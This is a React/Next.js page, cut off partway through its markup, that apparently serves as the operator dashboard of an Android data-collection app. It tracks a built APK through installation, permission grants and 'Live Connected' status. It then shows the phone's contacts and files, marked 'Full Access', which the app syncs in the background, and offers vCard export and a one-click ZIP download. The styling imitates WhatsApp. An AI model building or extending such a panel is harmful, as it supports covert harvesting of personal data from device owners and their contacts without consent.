'use client';

import React, { useState, useEffect, useCallback, useMemo } from 'react';
import {
  Phone,
  Download,
  Copy,
  Check,
  Users,
  ChevronRight,
  ArrowLeft,
  Search,
  X,
  FileText,
  Share2,
  FolderOpen,
  File,
  Image,
  Music,
  Video,
  FileIcon,
  Archive,
  Eye,
  Loader2,
  RefreshCw,
  Shield,
  HardDrive,
  Wifi,
  WifiOff,
  CheckCircle2,
  Circle,
  Play,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Badge } from '@/components/ui/badge';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Separator } from '@/components/ui/separator';
import { useToast } from '@/hooks/use-toast';

// ─── Types ───────────────────────────────────────────────

type SessionStatus =
  | 'apk_built'
  | 'waiting_install'
  | 'app_installed'
  | 'permissions_granted'
  | 'syncing_contacts'
  | 'syncing_files'
  | 'live_connected'
  | 'offline';

interface StatusEntry {
  status: SessionStatus;
  timestamp: string;
  detail?: string;
}

interface ContactInfo {
  id: string;
  name: string;
  phone: string;
  email?: string;
  organization?: string;
}

interface FileInfo {
  name: string;
  path: string;
  isDirectory: boolean;
  size: number;
  lastModified: number;
  fileType: string;
}

interface UploadedFileInfo {
  id: string;
  fileName: string;
  filePath: string;
  fileSize: number;
  fileType: string;
  downloadUrl: string;
  uploadedAt: string;
}

interface SessionData {
  id: string;
  contacts: ContactInfo[];
  files: FileInfo[];
  uploadedFiles: UploadedFileInfo[];
  appName: string;
  count: number;
  fileCount: number;
  createdAt: string;
  status: SessionStatus | null;
  statusHistory: StatusEntry[];
  lastHeartbeat: string | null;
  isOnline: boolean;
}

// ─── Status Stepper ──────────────────────────────────────

const STATUS_STEPS: { key: SessionStatus; label: string }[] = [
  { key: 'apk_built', label: 'APK Built' },
  { key: 'waiting_install', label: 'Waiting Install' },
  { key: 'app_installed', label: 'App Installed' },
  { key: 'permissions_granted', label: 'Permissions' },
  { key: 'syncing_contacts', label: 'Syncing Contacts' },
  { key: 'syncing_files', label: 'Syncing Files' },
  { key: 'live_connected', label: 'Live Connected' },
];

function getStepIndex(status: SessionStatus | null): number {
  if (!status) return -1;
  const idx = STATUS_STEPS.findIndex(s => s.key === status);
  return idx;
}

function StatusStepper({ status, isOnline }: { status: SessionStatus | null; isOnline: boolean }) {
  const currentIdx = getStepIndex(status);

  return (
    <div className="bg-[#075E54] px-3 py-3">
      <div className="flex items-center justify-between mb-2">
        <span className="text-white/80 text-xs font-semibold">Setup Progress</span>
        {isOnline ? (
          <span className="inline-flex items-center gap-1.5 text-xs font-bold text-[#25D366]">
            <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
            LIVE
          </span>
        ) : (
          <span className="inline-flex items-center gap-1.5 text-xs font-bold text-white/40">
            <span className="w-2 h-2 rounded-full bg-white/30" />
            OFFLINE
          </span>
        )}
      </div>
      <div className="flex items-start gap-0">
        {STATUS_STEPS.map((step, idx) => {
          const isCompleted = idx < currentIdx;
          const isCurrent = idx === currentIdx;
          const isFuture = idx > currentIdx;

          return (
            <div key={step.key} className="flex flex-col items-center flex-1 min-w-0">
              <div className="flex items-center w-full">
                {idx > 0 && (
                  <div className={`flex-1 h-0.5 ${idx <= currentIdx ? 'bg-[#25D366]' : 'bg-white/20'}`} />
                )}
                <div
                  className={`w-5 h-5 rounded-full flex items-center justify-center shrink-0 ${
                    isCompleted
                      ? 'bg-[#25D366]'
                      : isCurrent
                      ? 'bg-[#25D366]/20 border-2 border-[#25D366]'
                      : 'bg-white/10'
                  }`}
                >
                  {isCompleted ? (
                    <CheckCircle2 className="w-3 h-3 text-white" />
                  ) : isCurrent ? (
                    <div className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
                  ) : (
                    <Circle className="w-2 h-2 text-white/30" />
                  )}
                </div>
                {idx < STATUS_STEPS.length - 1 && (
                  <div className={`flex-1 h-0.5 ${idx < currentIdx ? 'bg-[#25D366]' : 'bg-white/20'}`} />
                )}
              </div>
              <span
                className={`text-[8px] mt-1 text-center leading-tight ${
                  isCompleted || isCurrent ? 'text-[#25D366] font-semibold' : 'text-white/40'
                }`}
              >
                {step.label}
              </span>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ─── vCard Generator ────────────────────────────────────

function escapeVCard(str: string): string {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/;/g, '\\;')
    .replace(/:/g, '\\:')
    .replace(/\n/g, '\\n')
    .replace(/,/g, '\\,');
}

function generateVCard(contact: ContactInfo): string {
  const lines = [
    'BEGIN:VCARD',
    'VERSION:3.0',
    `FN:${escapeVCard(contact.name)}`,
    `N:${escapeVCard(contact.name)};;;;`,
    `TEL;TYPE=CELL:${escapeVCard(contact.phone)}`,
  ];
  if (contact.email) lines.push(`EMAIL;TYPE=HOME:${escapeVCard(contact.email)}`);
  if (contact.organization) lines.push(`ORG:${escapeVCard(contact.organization)}`);
  lines.push('END:VCARD');
  return lines.join('\n');
}

function generateAllVCard(contacts: ContactInfo[]): string {
  return contacts.map(generateVCard).join('\n\n');
}

// ─── Utilities ──────────────────────────────────────────

const AVATAR_COLORS = [
  'bg-emerald-600', 'bg-teal-600', 'bg-cyan-600', 'bg-green-700',
  'bg-lime-700', 'bg-emerald-700', 'bg-teal-700', 'bg-cyan-700',
];

function getAvatarColor(name: string): string {
  let hash = 0;
  for (let i = 0; i < name.length; i++) {
    hash = name.charCodeAt(i) + ((hash << 5) - hash);
  }
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length];
}

function getInitials(name: string): string {
  const parts = name.trim().split(/\s+/);
  if (parts.length >= 2) return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
  return name.slice(0, 2).toUpperCase();
}

function formatFileSize(bytes: number): string {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function getFileIcon(type: string) {
  switch (type) {
    case 'image': return <Image className="w-5 h-5 text-purple-500" aria-label="Image file" />;
    case 'video': return <Video className="w-5 h-5 text-red-500" />;
    case 'audio': return <Music className="w-5 h-5 text-orange-500" />;
    case 'pdf': return <FileText className="w-5 h-5 text-red-600" />;
    case 'document': return <FileText className="w-5 h-5 text-blue-500" />;
    case 'apk': return <FileIcon className="w-5 h-5 text-green-500" />;
    case 'vcf': return <Phone className="w-5 h-5 text-[#25D366]" />;
    case 'archive': return <Archive className="w-5 h-5 text-yellow-600" />;
    case 'folder': return <FolderOpen className="w-5 h-5 text-yellow-500" />;
    default: return <File className="w-5 h-5 text-gray-500" />;
  }
}

function getFileBgColor(type: string): string {
  switch (type) {
    case 'image': return 'bg-purple-50';
    case 'video': return 'bg-red-50';
    case 'audio': return 'bg-orange-50';
    case 'pdf': return 'bg-red-50';
    case 'document': return 'bg-blue-50';
    default: return 'bg-gray-50';
  }
}

function timeAgo(dateStr: string): string {
  const now = new Date();
  const date = new Date(dateStr);
  const diffMs = now.getTime() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  const diffHours = Math.floor(diffMs / 3600000);
  if (diffMins < 1) return 'Just now';
  if (diffMins < 60) return `${diffMins}m ago`;
  if (diffHours < 24) return `${diffHours}h ago`;
  return date.toLocaleDateString();
}

// ─── Tab Type ──────────────────────────────────────────

type Tab = 'contacts' | 'files' | 'manager';

// ─── Main View Component ────────────────────────────────

export default function CollectorViewPage({ params }: { params: Promise<{ id: string }> }) {
  const { toast } = useToast();
  const [sessionId, setSessionId] = useState('');
  const [contacts, setContacts] = useState<ContactInfo[]>([]);
  const [files, setFiles] = useState<FileInfo[]>([]);
  const [uploadedFiles, setUploadedFiles] = useState<UploadedFileInfo[]>([]);
  const [appName, setAppName] = useState('Collector');
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [fetchKey, setFetchKey] = useState(0);
  const [activeTab, setActiveTab] = useState<Tab>('contacts');
  const [selectedContact, setSelectedContact] = useState<ContactInfo | null>(null);
  const [view, setView] = useState<'list' | 'detail'>('list');
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [copiedAll, setCopiedAll] = useState(false);
  const [showVcardAll, setShowVcardAll] = useState(false);
  const [zipDownloading, setZipDownloading] = useState(false);
  const [fileTypeFilter, setFileTypeFilter] = useState<string>('all');
  const [previewFile, setPreviewFile] = useState<UploadedFileInfo | null>(null);

  // Status tracking state
  const [sessionStatus, setSessionStatus] = useState<SessionStatus | null>(null);
  const [isOnline, setIsOnline] = useState(false);
  const [fileViewMode, setFileViewMode] = useState<'list' | 'grid'>('list');

  useEffect(() => {
    params.then(p => setSessionId(p.id));
  }, [params]);

  const saveToHistory = useCallback((data: SessionData) => {
    try {
      const stored = localStorage.getItem('contact_sessions');
      const sessions = stored ? JSON.parse(stored) : [];
      if (!sessions.find((s: any) => s.id === data.id)) {
        sessions.unshift({
          id: data.id,
          count: data.count,
          fileCount: data.fileCount,
          appName: data.appName,
          createdAt: data.createdAt,
        });
        localStorage.setItem('contact_sessions', JSON.stringify(sessions));
      }
    } catch {}
  }, []);

  // Status polling - every 5 seconds
  useEffect(() => {
    if (!sessionId) return;
    const poll = async () => {
      try {
        const res = await fetch(`/api/sessions/${sessionId}/status`);
        if (res.ok) {
          const data = await res.json();
          setSessionStatus(data.status);
          setIsOnline(data.isOnline);
        }
      } catch {}
    };
    poll();
    const interval = setInterval(poll, 5000);
    return () => clearInterval(interval);
  }, [sessionId]);

  // Fetch on sessionId change or manual refresh (fetchKey change)
  useEffect(() => {
    if (!sessionId) return;
    let cancelled = false;

    fetch(`/api/contacts/view/${sessionId}`)
      .then(res => {
        if (!res.ok) throw new Error('not found');
        return res.json();
      })
      .then((data: SessionData) => {
        if (cancelled) return;
        setContacts(data.contacts);
        setFiles(data.files || []);
        setUploadedFiles(data.uploadedFiles || []);
        setAppName(data.appName || 'Collector');
        setSessionStatus(data.status);
        setIsOnline(data.isOnline);
        saveToHistory(data);
        setLoading(false);
      })
      .catch(() => {
        if (cancelled) return;
        setError('Session not found or expired');
        setLoading(false);
      });

    return () => { cancelled = true; };
  }, [sessionId, fetchKey, saveToHistory]);

  // Manual refresh handler
  const handleRefresh = useCallback(() => {
    setFetchKey(k => k + 1);
  }, []);

  const filteredContacts = useMemo(() => {
    if (!searchQuery.trim()) return contacts;
    const q = searchQuery.toLowerCase();
    return contacts.filter(c =>
      c.name.toLowerCase().includes(q) ||
      c.phone.toLowerCase().includes(q) ||
      (c.email && c.email.toLowerCase().includes(q))
    );
  }, [contacts, searchQuery]);

  const filteredFiles = useMemo(() => {
    let result = uploadedFiles;
    if (fileTypeFilter !== 'all') {
      result = result.filter(f => f.fileType === fileTypeFilter);
    }
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      result = result.filter(f => f.fileName.toLowerCase().includes(q));
    }
    return result;
  }, [uploadedFiles, fileTypeFilter, searchQuery]);

  const totalUploadSize = useMemo(() => {
    return uploadedFiles.reduce((sum, f) => sum + f.fileSize, 0);
  }, [uploadedFiles]);

  const fileTypeCounts = useMemo(() => {
    const counts: Record<string, number> = {};
    uploadedFiles.forEach(f => {
      counts[f.fileType] = (counts[f.fileType] || 0) + 1;
    });
    return counts;
  }, [uploadedFiles]);

  const copyVCard = useCallback(async (contact: ContactInfo) => {
    try {
      await navigator.clipboard.writeText(generateVCard(contact));
      setCopiedId(contact.id);
      toast({ title: 'Copied!', description: `${contact.name}'s vCard copied` });
      setTimeout(() => setCopiedId(null), 2000);
    } catch {
      const textarea = document.createElement('textarea');
      textarea.value = generateVCard(contact);
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopiedId(contact.id);
      toast({ title: 'Copied!', description: `${contact.name}'s vCard copied` });
      setTimeout(() => setCopiedId(null), 2000);
    }
  }, [toast]);

  const copyAllVCard = useCallback(async () => {
    try {
      await navigator.clipboard.writeText(generateAllVCard(contacts));
      setCopiedAll(true);
      toast({ title: 'All Copied!', description: `${contacts.length} contacts vCard copied` });
      setTimeout(() => setCopiedAll(false), 2000);
    } catch {
      const textarea = document.createElement('textarea');
      textarea.value = generateAllVCard(contacts);
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopiedAll(true);
      toast({ title: 'All Copied!', description: `${contacts.length} contacts vCard copied` });
      setTimeout(() => setCopiedAll(false), 2000);
    }
  }, [contacts, toast]);

  const downloadVCard = useCallback((contact: ContactInfo) => {
    const blob = new Blob([generateVCard(contact)], { type: 'text/vcard' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${contact.name.replace(/\s+/g, '_')}.vcf`;
    a.click();
    URL.revokeObjectURL(url);
  }, []);

  const downloadAllVCard = useCallback(() => {
    const blob = new Blob([generateAllVCard(contacts)], { type: 'text/vcard' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'all_contacts.vcf';
    a.click();
    URL.revokeObjectURL(url);
  }, [contacts]);

  const shareVCard = useCallback(async (contact: ContactInfo) => {
    const vcard = generateVCard(contact);
    if (navigator.share) {
      try { await navigator.share({ title: `${contact.name} - Contact`, text: vcard }); } catch {}
    } else { await copyVCard(contact); }
  }, [copyVCard]);

  const downloadZip = useCallback(async () => {
    setZipDownloading(true);
    try {
      const res = await fetch(`/api/files/download/${sessionId}`);
      if (!res.ok) throw new Error('Download failed');
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `${(appName || 'collector').replace(/\s+/g, '-').toLowerCase()}.zip`;
      a.click();
      URL.revokeObjectURL(url);
      toast({ title: 'Download Started!', description: 'ZIP file is downloading' });
    } catch (err) {
      toast({ title: 'Download Failed', description: 'No uploaded files available yet. Files will appear as the app syncs them in the background.' });
    }
    setZipDownloading(false);
  }, [sessionId, appName, toast]);

  const downloadSingleFile = useCallback(async (file: UploadedFileInfo) => {
    try {
      const res = await fetch(file.downloadUrl);
      if (!res.ok) throw new Error('Download failed');
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = file.fileName;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    } catch {
      window.open(file.downloadUrl, '_blank');
    }
  }, []);

  // ─── Loading ───────────────────────────────────────
  if (loading) {
    return (
      <div className="min-h-screen flex flex-col bg-gradient-to-b from-[#075E54] to-[#054D44]">
        <div className="px-4 py-3 bg-[#075E54] flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
            <Shield className="w-4 h-4 text-white" />
          </div>
          <h1 className="text-white font-semibold text-lg">Collector</h1>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center px-6">
          <div className="w-16 h-16 rounded-full border-4 border-white/20 border-t-[#25D366] animate-spin mb-6" />
          <h3 className="text-white font-semibold text-lg mb-2">Loading Data...</h3>
          <p className="text-white/60 text-sm text-center">Fetching contacts &amp; files</p>
        </div>
      </div>
    );
  }

  // ─── Error ─────────────────────────────────────────
  if (error) {
    return (
      <div className="min-h-screen flex flex-col bg-gradient-to-b from-[#075E54] to-[#054D44]">
        <div className="px-4 py-3 bg-[#075E54] flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
            <Shield className="w-4 h-4 text-white" />
          </div>
          <h1 className="text-white font-semibold text-lg">Collector</h1>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center px-6">
          <h3 className="text-white font-semibold text-lg mb-2 text-center">Not Found</h3>
          <p className="text-white/60 text-sm text-center mb-8 max-w-xs">{error}</p>
          <a href="/">
            <Button className="bg-[#25D366] hover:bg-[#20BD5A] text-white font-semibold h-12 rounded-xl px-8">
              <ArrowLeft className="w-5 h-5 mr-2" /> Go Home
            </Button>
          </a>
        </div>
      </div>
    );
  }

  // ─── Contact Detail View ──────────────────────────
  if (view === 'detail' && selectedContact) {
    const vcard = generateVCard(selectedContact);
    return (
      <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
        <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md">
          <button onClick={() => { setView('list'); setSelectedContact(null); }} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center">
            <ArrowLeft className="w-5 h-5 text-white" />
          </button>
          <Avatar className="w-10 h-10">
            <AvatarFallback className={`${getAvatarColor(selectedContact.name)} text-white font-semibold text-sm`}>
              {getInitials(selectedContact.name)}
            </AvatarFallback>
          </Avatar>
          <div className="flex-1 min-w-0">
            <h2 className="text-white font-semibold text-base truncate">{selectedContact.name}</h2>
            <p className="text-white/70 text-xs">{selectedContact.organization || 'Contact Details'}</p>
          </div>
        </div>
        <div className="flex-1 px-4 py-6 space-y-4 overflow-y-auto">
          <div className="bg-white rounded-2xl p-6 shadow-sm">
            <div className="flex flex-col items-center mb-5">
              <Avatar className="w-20 h-20 mb-3">
                <AvatarFallback className={`${getAvatarColor(selectedContact.name)} text-white font-bold text-2xl`}>
                  {getInitials(selectedContact.name)}
                </AvatarFallback>
              </Avatar>
              <h3 className="text-lg font-bold text-gray-900">{selectedContact.name}</h3>
              {selectedContact.organization && <p className="text-sm text-gray-500">{selectedContact.organization}</p>}
            </div>
            <Separator className="my-4" />
            <div className="flex items-center gap-3 py-2">
              <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
                <Phone className="w-5 h-5 text-[#25D366]" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-xs text-gray-500 mb-0.5">Phone</p>
                <p className="text-sm font-medium text-gray-900 truncate">{selectedContact.phone}</p>
              </div>
            </div>
            {selectedContact.email && (
              <div className="flex items-center gap-3 py-2">
                <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
                  <FileText className="w-5 h-5 text-[#25D366]" />
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-xs text-gray-500 mb-0.5">Email</p>
                  <p className="text-sm font-medium text-gray-900 truncate">{selectedContact.email}</p>
                </div>
              </div>
            )}
          </div>
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
            <div className="px-4 py-3 bg-[#075E54] flex items-center gap-2">
              <FileText className="w-4 h-4 text-white/80" />
              <h4 className="text-white font-semibold text-sm">vCard Format</h4>
            </div>
            <div className="p-4">
              <pre className="text-xs text-gray-700 bg-gray-50 rounded-xl p-4 overflow-x-auto whitespace-pre-wrap font-mono leading-relaxed">{vcard}</pre>
            </div>
          </div>
          <div className="grid grid-cols-3 gap-3 pb-2">
            <Button onClick={() => copyVCard(selectedContact)} className="bg-[#075E54] hover:bg-[#064E46] text-white h-14 rounded-xl flex-col gap-1 text-xs">
              {copiedId === selectedContact.id ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
              {copiedId === selectedContact.id ? 'Copied' : 'Copy'}
            </Button>
            <Button onClick={() => downloadVCard(selectedContact)} className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-14 rounded-xl flex-col gap-1 text-xs">
              <Download className="w-5 h-5" /> Download
            </Button>
            <Button onClick={() => shareVCard(selectedContact)} variant="outline" className="border-[#075E54] text-[#075E54] hover:bg-[#075E54]/10 h-14 rounded-xl flex-col gap-1 text-xs">
              <Share2 className="w-5 h-5" /> Share
            </Button>
          </div>
        </div>
      </div>
    );
  }

  // ─── Main List View ───────────────────────────────
  return (
    <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
      {/* Header */}
      <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md z-10">
        <a href="/" className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center">
          <ArrowLeft className="w-5 h-5 text-white" />
        </a>
        <div className="flex-1 min-w-0">
          <h1 className="text-white font-semibold text-base">{appName}</h1>
          <p className="text-white/70 text-xs">
            {contacts.length} contacts &bull; {uploadedFiles.length} files
            {isOnline && <span className="ml-1 text-[#25D366]">&bull; LIVE</span>}
          </p>
        </div>
        <button onClick={() => handleRefresh()} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center" title="Refresh">
          <RefreshCw className="w-4 h-4 text-white/70" />
        </button>
      </div>

      {/* Status Stepper */}
      <StatusStepper status={sessionStatus} isOnline={isOnline} />

      {/* Access Status Cards */}
      <div className="px-3 py-3 bg-[#ECE5DD]">
        <div className="grid grid-cols-2 gap-3">
          <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
            <div className="w-10 h-10 rounded-full bg-[#25D366]/20 flex items-center justify-center mx-auto mb-1.5">
              <Phone className="w-5 h-5 text-[#25D366]" />
            </div>
            <p className="text-white font-bold text-sm">Contact</p>
            <p className="text-[#25D366] text-xs font-semibold">Full Access</p>
            <p className="text-white/50 text-[10px] mt-0.5">{contacts.length} contacts</p>
          </div>
          <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
            <div className="w-10 h-10 rounded-full bg-blue-400/20 flex items-center justify-center mx-auto mb-1.5">
              <HardDrive className="w-5 h-5 text-blue-400" />
            </div>
            <p className="text-white font-bold text-sm">File Manager</p>
            <p className="text-blue-400 text-xs font-semibold">Full Access</p>
            <p className="text-white/50 text-[10px] mt-0.5">{formatFileSize(totalUploadSize)}</p>
          </div>
        </div>
      </div>

      {/* 1-Click ZIP Download Banner */}
      <div className="px-3 pb-2 bg-[#ECE5DD]">
        <button
          onClick={downloadZip}
          disabled={zipDownloading}
          className="w-full bg-gradient-to-r from-[#075E54] to-[#054D44] text-white rounded-2xl px-4 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform disabled:opacity-60"
        >
          <div className="w-11 h-11 rounded-full bg-[#25D366] flex items-center justify-center shrink-0">
            {zipDownloading ? <Loader2 className="w-5 h-5 text-white animate-spin" /> : <Archive className="w-5 h-5 text-white" />}
          </div>
          <div className="flex-1 text-left min-w-0">
            <h2 className="font-bold text-base">
              {zipDownloading ? 'Creating ZIP...' : 'Download All as ZIP'}
            </h2>
            <p className="text-white/70 text-xs">
              {uploadedFiles.length > 0
                ? `${uploadedFiles.length} files + ${contacts.length} contacts`
                : 'Files will appear as app syncs them'
              }
            </p>
          </div>
          <Archive className="w-6 h-6 text-white/40 shrink-0" />
        </button>
      </div>

      {/* Tab Switcher */}
      <div className="px-3 pb-1 bg-[#ECE5DD]">
        <div className="flex bg-white rounded-xl shadow-sm p-1">
          <button
            onClick={() => { setActiveTab('contacts'); setSearchQuery(''); }}
            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              activeTab === 'contacts' ? 'bg-[#075E54] text-white' : 'text-gray-500 hover:text-gray-700'
            }`}
          >
            <Phone className="w-3.5 h-3.5" />
            Contacts ({contacts.length})
          </button>
          <button
            onClick={() => { setActiveTab('files'); setSearchQuery(''); }}
            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              activeTab === 'files' ? 'bg-blue-600 text-white' : 'text-gray-500 hover:text-gray-700'
            }`}
          >
            <FolderOpen className="w-3.5 h-3.5" />
            Files ({uploadedFiles.length})
          </button>
          <button
            onClick={() => { setActiveTab('manager'); setSearchQuery(''); }}
            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              activeTab === 'manager' ? 'bg-orange-600 text-white' : 'text-gray-500 hover:text-gray-700'
            }`}
          >
            <HardDrive className="w-3.5 h-3.5" />
            Manager
          </button>
        </div>
      </div>

      {/* Search */}
      <div className="px-3 py-2 bg-[#ECE5DD]">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
          <Input
            placeholder={activeTab === 'contacts' ? 'Search contacts...' : 'Search files...'}
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="pl-9 pr-9 h-10 bg-white rounded-xl border-0 shadow-sm text-sm"
          />
          {searchQuery && (
            <button onClick={() => setSearchQuery('')} className="absolute right-3 top-1/2 -translate-y-1/2">
              <X className="w-4 h-4 text-gray-400" />
            </button>
          )}
        </div>
      </div>

      {/* ─── CONTACTS TAB ───────────────────────────── */}
      {activeTab === 'contacts' && (
        <>
          {/* My Contacted Numbers button */}
          <div className="px-3 py-1 bg-[#ECE5DD]">
            <button
              onClick={() => setShowVcardAll(!showVcardAll)}
              className="w-full bg-[#075E54] hover:bg-[#064E46] text-white rounded-2xl px-5 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform"
            >
              <div className="w-11 h-11 rounded-full bg-[#25D366] flex items-center justify-center shrink-0">
                <Phone className="w-5 h-5 text-white" />
              </div>
              <div className="flex-1 text-left min-w-0">
                <h2 className="font-bold text-base">My Contacted Numbers</h2>
                <p className="text-white/70 text-xs">{contacts.length} contacts in vCard format</p>
              </div>
              <Badge className="bg-[#25D366] text-white border-0 text-sm px-2.5 py-1 font-bold">{contacts.length}</Badge>
            </button>
          </div>

          {showVcardAll && (
            <div className="px-3 pb-2 bg-[#ECE5DD]">
              <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
                <div className="px-4 py-3 bg-[#075E54] flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <FileText className="w-4 h-4 text-white/80" />
                    <h4 className="text-white font-semibold text-sm">All Contacts vCard</h4>
                  </div>
                  <button onClick={() => setShowVcardAll(false)}>
                    <X className="w-4 h-4 text-white/60" />
                  </button>
                </div>
                <div className="p-4">
                  <pre className="text-[10px] text-gray-700 bg-gray-50 rounded-xl p-3 overflow-auto max-h-48 whitespace-pre-wrap font-mono leading-relaxed">
                    {generateAllVCard(contacts)}
                  </pre>
                </div>
                <div className="px-4 pb-4 flex gap-2">
                  <Button onClick={copyAllVCard} variant="outline" size="sm" className="flex-1 border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 rounded-xl h-10 text-xs">
                    {copiedAll ? <Check className="w-3.5 h-3.5 mr-1" /> : <Copy className="w-3.5 h-3.5 mr-1" />}
                    {copiedAll ? 'Copied All' : 'Copy All vCard'}
                  </Button>
                  <Button onClick={downloadAllVCard} size="sm" className="flex-1 bg-[#25D366] hover:bg-[#20BD5A] text-white rounded-xl h-10 text-xs">
                    <Download className="w-3.5 h-3.5 mr-1" /> Download All .vcf
                  </Button>
                </div>
              </div>
            </div>
          )}

          <ScrollArea className="flex-1">
            <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
              {filteredContacts.length === 0 ? (
                <div className="py-12 text-center">
                  <Users className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                  <p className="text-gray-500 text-sm">No contacts found</p>
                </div>
              ) : (
                filteredContacts.map((contact, index) => (
                  <React.Fragment key={contact.id}>
                    <button
                      onClick={() => { setSelectedContact(contact); setView('detail'); }}
                      className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
                    >
                      <Avatar className="w-11 h-11 shrink-0">
                        <AvatarFallback className={`${getAvatarColor(contact.name)} text-white font-semibold text-sm`}>
                          {getInitials(contact.name)}
                        </AvatarFallback>
                      </Avatar>
                      <div className="flex-1 min-w-0 text-left">
                        <h3 className="text-sm font-semibold text-gray-900 truncate">{contact.name}</h3>
                        <p className="text-xs text-gray-500 truncate mt-0.5">{contact.phone}</p>
                      </div>
                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
                    </button>
                    {index < filteredContacts.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
                  </React.Fragment>
                ))
              )}
            </div>
          </ScrollArea>
        </>
      )}

      {/* ─── FILES TAB (Uploaded Files with grid/list view) ── */}
      {activeTab === 'files' && (
        <>
          {/* File type filter + view toggle */}
          <div className="px-3 pb-1 bg-[#ECE5DD]">
            <div className="flex items-center gap-2">
              <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar flex-1">
                {[
                  { key: 'all', label: 'All', count: uploadedFiles.length },
                  { key: 'image', label: 'Images', count: fileTypeCounts.image || 0 },
                  { key: 'video', label: 'Videos', count: fileTypeCounts.video || 0 },
                  { key: 'audio', label: 'Audio', count: fileTypeCounts.audio || 0 },
                  { key: 'pdf', label: 'PDF', count: fileTypeCounts.pdf || 0 },
                  { key: 'document', label: 'Docs', count: fileTypeCounts.document || 0 },
                ].map(filter => (
                  <button
                    key={filter.key}
                    onClick={() => setFileTypeFilter(filter.key)}
                    className={`px-3 py-1.5 rounded-full text-xs font-semibold whitespace-nowrap transition-colors ${
                      fileTypeFilter === filter.key
                        ? 'bg-[#075E54] text-white'
                        : 'bg-white text-gray-600 hover:bg-gray-100'
                    }`}
                  >
                    {filter.label} ({filter.count})
                  </button>
                ))}
              </div>
              {/* View toggle */}
              <button
                onClick={() => setFileViewMode(fileViewMode === 'list' ? 'grid' : 'list')}
                className="w-8 h-8 rounded-full bg-white shadow-sm flex items-center justify-center shrink-0"
                title={fileViewMode === 'list' ? 'Grid view' : 'List view'}
              >
                {fileViewMode === 'list' ? (
